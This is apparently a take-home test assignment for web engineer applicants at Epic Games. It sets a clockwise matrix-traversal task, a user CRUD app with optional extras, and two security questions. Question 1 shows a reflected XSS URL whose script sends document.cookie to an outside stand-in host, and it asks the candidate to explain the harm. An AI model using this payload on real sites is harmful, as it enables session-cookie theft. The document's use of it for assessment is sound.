# Epic Games, Web Engineer Test Assignment

Thank you for taking the time to complete the test assignment! The assignment consists of two programming tasks and two questions. Please return your response to your recruiter as a zip file within **one week**. This will keep responses private and easy to access for us.

## (Optional) Your links and code samples

You may send us a link to your portfolio or to any GitHub repositories where you are an active contributor. For projects that showcase your knowledge in building full stack web applications or expertise in a domain related to this position (for instance being a core contributor to popular open source library), then you may skip the programming tasks in this assignment. If you choose to submit work examples instead of the programming tasks, please send an email with the title, **FirstName.LastName: Coding Examples** to your recruiter and we will respond if the examples submitted are sufficient.

## Instructions

- Make sure you have the latest versions of [node](https://nodejs.org/en/) and [yarn](https://yarnpkg.com/en/) installed.
- Initialize git and use it during the assignment.

## Task 1: Clockwise Matrix

In [Task1.js](./src/task1/Task1.js), write a function that, given a matrix of integers, builds a string with the entries of that matrix appended in clockwise order.

The function should accept a string representing the matrix as shown below: brackets around each row of comma-separated integers, and a newline between each row. The function should return the solution string of comma-separated integers. Please write tests for this function in [Task1.test.js](./src/task1/Task1.test.js) and add command `yarn test:task1`. Note that this field takes human input, so parsing and validation is important.

Example Input:

<table>
<tr><th>Input</th><th>Output</th></tr>
<tr><td>

```json
[2, 3, 4,  8]
[5, 7, 9, 12]
[1, 0, 6, 10]
```

</td><td>2, 3, 4, 8, 12, 10, 6, 0, 1, 5, 7, 9</td></tr>

<tr><td>

```json
[ 1,  2,  3]
[ 4,  5,  6]
[ 7,  8,  9]
[10, 11, 12]
```

</td><td>1, 2, 3, 6, 9, 12, 11, 10, 7, 4, 5, 8</td></tr>

<tr><td>

```json
[1, 2]
[3, 4]
```

</td><td>1, 2, 4, 3</td></tr>

<tr><td>

```json
[1, 2, 3]
[4, 5, 6]
[7, 8, 9]
```

</td><td>1, 2, 3, 6, 9, 8, 7, 4, 5</td></tr>

<tr><td>

```json
[ 1,  2,  3,  4,  5]
[ 6,  7,  8,  9, 10]
[11, 12, 13, 14, 15]
[16, 17, 18, 19, 20]
```

</td><td>1, 2, 3, 4, 5, 10, 15, 20, 19, 18, 17, 16, 11, 6, 7, 8, 9, 14, 13, 12</td></tr>

</table>

State your assumptions when you solve the problem in Task 1.

How much time did you spend on this task?

## Task 2: Real World App

We have provided a sample in-memory service that you can either use or replace under [task2/service](./src/task2/service/index.js) folder. The mock service can be started with `yarn start:task2`.

You need to create a simple account management service and page(s) that allows an internal customer service team to perform CRUD operations on users. An account consists of a person's name, date of birth, and email. Feel free to use any external libraries or frameworks that you feel will help, and extend and enhance the test application as you would for a production-ready app. Writing tests for your code is recommended.

### Please explain your design choices

### Extras

Once you have created a basic CRUD front-end, enhance your application with one or more of the following features:

- Improved User Experience and front-end design. Create a user experience that improves workflow in some way.

  - What are some of the design decisions that you made?

- Full service implementation. Replace the in-memory service with a real back end (mongo/sql/etc).

  - What considerations did you make for adding this additional data?
  - How would you scale this system to millions of accounts?

- Add searching/filtering functionality to the accounts. Give the user the ability to search for a specific account. Bonus points if you use a single search box (omni-search) that searches the fields based on user input.

  - How would this search scale if there were a million accounts?
  - What considerations did you make for performance?

- Implement performance instrumentation for your application. Instrument your application in such a way that you get detailed insight into how it performs.

  - Which parts of the app did you instrument and why did you consider those areas?
  - Describe how the instrumentation you added could be used by QA to identify action items to improve the application's performance (give examples where possible)

State your assumptions when you solve each problem in Task 2.

How much time did you spend on the main task?

How much time did you spend on extras?

## Question 1: What harm could result from the following?

```
http://www.example.com/search?q=\<script\>object.src="http://otherexample.com/code?data="+document.cookie\</script>
```

Your answer:

## Question 2: Explain what security measures need to be taken into consideration for web applications

Your answer:
